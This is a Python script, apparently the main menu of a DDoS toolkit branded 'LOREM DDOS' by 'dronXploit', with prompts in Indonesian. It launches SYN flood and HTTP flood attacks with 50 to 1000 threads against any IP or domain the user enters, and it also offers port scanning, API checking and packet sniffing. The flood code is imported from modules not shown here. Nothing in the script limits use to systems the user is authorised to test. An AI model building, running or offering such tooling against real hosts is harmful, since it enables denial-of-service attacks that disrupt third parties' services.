#!/usr/bin/env python3
import argparse
import asyncio
import sys
import signal
from datetime import datetime
from ddos_attacker import DDoSAttacker
from scanner import PortScanner
from packet_sniffer import PacketSniffer
from api_checker import APIChecker

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

    @staticmethod
    def colorize(text, color):
        return f"{color}{text}{Colors.END}"

class AdvancedNetworkTool:
    def __init__(self):
        self.show_banner()
        signal.signal(signal.SIGINT, self.signal_handler)

    def show_banner(self):
        print(Colors.colorize(r"""                                                                  
                                                                                                                                                                          
    ██╗      ██████╗ ██████╗ ███████╗███╗   ███╗
    ██║     ██╔═══██╗██╔══██╗██╔════╝████╗ ████║
    ██║     ██║   ██║██████╔╝█████╗  ██╔████╔██║
    ██║     ██║   ██║██╔══██╗██╔══╝  ██║╚██╔╝██║
    ███████╗╚██████╔╝██║  ██║███████╗██║ ╚═╝ ██║
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝
    ██████╗ ██████╗  ██████╗ ███████╗           
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝           
    ██║  ██║██║  ██║██║   ██║███████╗           
    ██║  ██║██║  ██║██║   ██║╚════██║           
    ██████╔╝██████╔╝╚██████╔╝███████║          
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝  VERSION: 2.0            
    ===========================================================
      Author              : dronXploit
      Visit me only on    : https://instagram.com/dronxploit
      Sawer me by         : https://saweria.co/dronxploit
    -----------------------------------------------------------
        """, Colors.PURPLE))

    def signal_handler(self, sig, frame):
        print(Colors.colorize("\n[!] Received interrupt signal - Exiting gracefully", Colors.YELLOW))
        sys.exit(0)

    def get_target_input(self, prompt):
        while True:
            target = input(Colors.colorize(prompt, Colors.BOLD + Colors.WHITE)).strip()
            if target:
                return target
            print(Colors.colorize("[!] Input tidak boleh kosong", Colors.RED))

    def main_menu(self):
        print(Colors.colorize("\n[MAIN MENU]", Colors.BOLD + Colors.CYAN))
        print(Colors.colorize("1. Port Scanner", Colors.GREEN))
        print(Colors.colorize("2. API Checker", Colors.GREEN))
        print(Colors.colorize("3. DDoS Attack Tool", Colors.GREEN))
        print(Colors.colorize("4. Packet Sniffer", Colors.GREEN))
        print(Colors.colorize("5. Exit", Colors.RED))
        
        choice = input(Colors.colorize("Pilih menu (1-5): ", Colors.BOLD)).strip()
        return choice

    def ddos_menu(self, target):
        print(Colors.colorize("\n[DDoS ATTACK OPTIONS]", Colors.BOLD + Colors.CYAN))
        print(Colors.colorize(f"Target: {target}", Colors.YELLOW))
        print(Colors.colorize("1. SYN Flood Attack", Colors.GREEN))
        print(Colors.colorize("2. HTTP Flood Attack", Colors.GREEN))
        print(Colors.colorize("3. Kembali ke menu utama", Colors.RED))
        
        choice = input(Colors.colorize("Pilih jenis serangan (1-3): ", Colors.BOLD)).strip()
        if choice == '1':
            return 'syn'
        elif choice == '2':
            return 'http'
        else:
            return None

    def get_thread_count(self):
        while True:
            try:
                threads = int(input(Colors.colorize("Jumlah threads (50-1000): ", Colors.BOLD)).strip())
                if 50 <= threads <= 1000:
                    return threads
                print(Colors.colorize("[!] Masukkan angka antara 50-1000", Colors.RED))
            except ValueError:
                print(Colors.colorize("[!] Input harus angka", Colors.RED))

    def run_port_scan(self):
        print(Colors.colorize("\n[PORT SCANNER]", Colors.BOLD + Colors.CYAN))
        target = self.get_target_input("Masukkan target (IP/Domain): ")
        print(Colors.colorize(f"\n[*] Memulai scan pada {target}...", Colors.YELLOW))
        
        scanner = PortScanner(target)
        try:
            open_ports = asyncio.run(scanner.scan_ports(1, 1000))
            if open_ports:
                print(Colors.colorize("\n[+] Hasil Scan:", Colors.BOLD + Colors.GREEN))
                for port in sorted(open_ports):
                    print(Colors.colorize(f" - Port {port} terbuka", Colors.GREEN))
            else:
                print(Colors.colorize("[-] Tidak ada port terbuka yang ditemukan", Colors.YELLOW))
        except Exception as e:
            print(Colors.colorize(f"[!] Error: {str(e)}", Colors.RED))

    def run_api_check(self):
        print(Colors.colorize("\n[API CHECKER]", Colors.BOLD + Colors.CYAN))
        url = self.get_target_input("Masukkan URL API: ")
        print(Colors.colorize(f"\n[*] Memeriksa API: {url}", Colors.YELLOW))
        
        checker = APIChecker(url)
        try:
            checker.check_api()
        except Exception as e:
            print(Colors.colorize(f"[!] Error: {str(e)}", Colors.RED))

    def run_ddos_attack(self):
        print(Colors.colorize("\n[DDoS ATTACK TOOL]", Colors.BOLD + Colors.CYAN))
        target = self.get_target_input("Masukkan target (IP/Domain): ")
        port = 80  # Default port
        
        if ":" in target:
            target, port_str = target.split(":")
            try:
                port = int(port_str)
            except ValueError:
                print(Colors.colorize("[!] Port tidak valid, menggunakan port 80", Colors.YELLOW))
                port = 80

        attack_type = self.ddos_menu(target)
        if not attack_type:
            return

        threads = self.get_thread_count()
        
        print(Colors.colorize(f"\n[!] KONFIRMASI SERANGAN:", Colors.BOLD + Colors.RED))
        print(Colors.colorize(f"Target: {target}:{port}", Colors.YELLOW))
        print(Colors.colorize(f"Tipe: {attack_type.upper()} Flood", Colors.YELLOW))
        print(Colors.colorize(f"Threads: {threads}", Colors.YELLOW))
        confirm = input(Colors.colorize("Lanjutkan serangan? (y/n): ", Colors.BOLD)).strip().lower()
        
        if confirm != 'y':
            print(Colors.colorize("[*] Serangan dibatalkan", Colors.YELLOW))
            return
            
        print(Colors.colorize("\n[!] MEMULAI SERANGAN (Ctrl+C untuk berhenti)", Colors.BOLD + Colors.RED))
        attacker = DDoSAttacker(target, port, threads)
        try:
            attacker.start_attack(attack_type)
            while True:  # Keep main thread alive
                input(Colors.colorize("\nTekan Enter untuk menghentikan serangan...", Colors.YELLOW))
                break
        except KeyboardInterrupt:
            pass
        finally:
            attacker.stop_attack()

    def run_packet_sniffer(self):
        print(Colors.colorize("\n[PACKET SNIFFER]", Colors.BOLD + Colors.CYAN))
        target = self.get_target_input("Masukkan target (IP/Domain): ")
        print(Colors.colorize(f"\n[*] Memulai sniffing pada {target}...", Colors.YELLOW))
        
        sniffer = PacketSniffer(target)
        try:
            print(Colors.colorize("[*] Tekan Ctrl+C untuk menghentikan sniffing", Colors.YELLOW))
            sniffer.start_sniffing()
        except Exception as e:
            print(Colors.colorize(f"[!] Error: {str(e)}", Colors.RED))

    def run(self):
        while True:
            choice = self.main_menu()
            
            if choice == '1':
                self.run_port_scan()
            elif choice == '2':
                self.run_api_check()
            elif choice == '3':
                self.run_ddos_attack()
            elif choice == '4':
                self.run_packet_sniffer()
            elif choice == '5':
                print(Colors.colorize("\n[+] Keluar dari program...", Colors.GREEN))
                break
            else:
                print(Colors.colorize("[!] Pilihan tidak valid", Colors.RED))

            input(Colors.colorize("\nTekan Enter untuk kembali ke menu utama...", Colors.YELLOW))

if __name__ == "__main__":
    try:
        tool = AdvancedNetworkTool()
        tool.run()
    except Exception as e:
        print(Colors.colorize(f"[!] Fatal Error: {str(e)}", Colors.RED))
        sys.exit(1)